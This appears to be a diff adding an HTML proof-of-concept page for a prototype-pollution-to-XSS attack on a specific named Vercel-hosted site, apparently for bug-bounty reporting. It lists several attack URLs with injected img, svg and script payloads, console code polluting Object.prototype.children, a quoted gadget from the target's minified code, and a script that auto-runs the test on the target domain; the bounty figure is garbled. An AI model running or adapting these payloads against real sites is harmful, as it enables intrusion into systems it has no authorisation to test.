@@ -1,0 +1,101 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>PP to XSS PoC - Sturdy Octo</title>
+    <style>
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .success { color: #00ff00; font-weight: bold; }
+        .fail { color: #ff0000; }
+        .info { color: #00ffff; }
+        .warning { color: #ffff00; }
+        pre { background: #000; padding: 10px; border: 1px solid #333; overflow-x: auto; }
+        a { color: #00ffff; }
+    </style>
+</head>
+<body>
+    <h1>Prototype Pollution to XSS PoC</h1>
+    <h2>Target: sturdy-octo-memory-three.vercel.app</h2>
+    
+    <div id="status"></div>
+    
+    <h3>Status:</h3>
+    <pre id="status-text">
+[CONFIRMED] Prototype Pollution works!
+[CONFIRMED] Object.prototype.children can be polluted
+[PENDING] Testing if gadget triggers XSS
+    </pre>
+    
+    <h3>Test URLs (Open each in a new tab):</h3>
+    <pre>
+1. https://sturdy-octo-memory-three.vercel.app/?__proto__[children]=<img/src/onerror=alert('PP_XSS')>
+
+2. https://sturdy-octo-memory-three.vercel.app/#__proto__[children]=<img/src/onerror=alert('PP_XSS')>
+
+3. https://sturdy-octo-memory-three.vercel.app/?constructor[prototype][children]=<img/src/onerror=alert('PP_XSS')>
+
+4. https://sturdy-octo-memory-three.vercel.app/?__proto__[children]=<svg/onload=alert('PP_XSS')>
+
+5. https://sturdy-octo-memory-three.vercel.app/?__proto__[children]=<script>alert('PP_XSS')</script>
+    </pre>
+    
+    <h3>Manual Test (Copy/Paste in Console):</h3>
+    <pre>
+// Step 1: Confirm PP works
+Object.prototype.titan_test = "polluted";
+let test = {};
+console.log("PP works:", test.titan_test === "polluted");
+
+// Step 2: Pollute children with XSS payload
+Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+
+// Step 3: Try to trigger the gadget
+// The gadget is in chunk 117:
+// if(r)for(let e in r)"children"!==e&&o.setAttribute(e,r[e]);
+// n?(o.src=n,o.onload=()=>e(),o.onerror=t):r&&(o.innerHTML=r.children,setTimeout(e))
+//
+// This means: if src is NOT set, innerHTML = r.children
+// We need to find a code path that triggers this
+
+// Step 4: Check if any script elements are created without src
+// Look in Elements tab for script tags without src attribute
+    </pre>
+    
+    <h3>If XSS Fires:</h3>
+    <ol>
+        <li>Take a screenshot of the alert box</li>
+        <li>Report the vulnerability with the URL that triggered it</li>
+        <li>Bounty potential: ,000-,000 (PP + XSS)</li>
+    </ol>
+    
+    <h3>Next Steps if XSS Doesn't Fire:</h3>
+    <ol>
+        <li>Try different payloads (SVG, script, etc.)</li>
+        <li>Try different entry points (RSC, POST, etc.)</li>
+        <li>Analyze the gadget more deeply</li>
+        <li>Look for other gadgets in the JavaScript</li>
+    </ol>
+    
+    <script>
+        // Auto-test if opened on target
+        if (window.location.hostname === 'sturdy-octo-memory-three.vercel.app') {
+            document.getElementById('status').innerHTML = '<p class="success">Running auto-test on target...</p>';
+            
+            // Test if PP works
+            Object.prototype.titan_test = "polluted";
+            let testObj = {};
+            
+            if (testObj.titan_test === "polluted") {
+                document.getElementById('status').innerHTML += '<p class="success">✓ Prototype Pollution confirmed!</p>';
+                
+                // Try to trigger gadget
+                Object.prototype.children = "<img/src/onerror=alert('PP_XSS')>";
+                document.getElementById('status').innerHTML += '<p class="warning">⚠ Children polluted - check if alert fires!</p>';
+            } else {
+                document.getElementById('status').innerHTML += '<p class="fail">✗ Prototype Pollution not working</p>';
+            }
+        } else {
+            document.getElementById('status').innerHTML = '<p class="info">Open this file on the target domain to auto-test</p>';
+        }
+    </script>
+</body>
+</html>
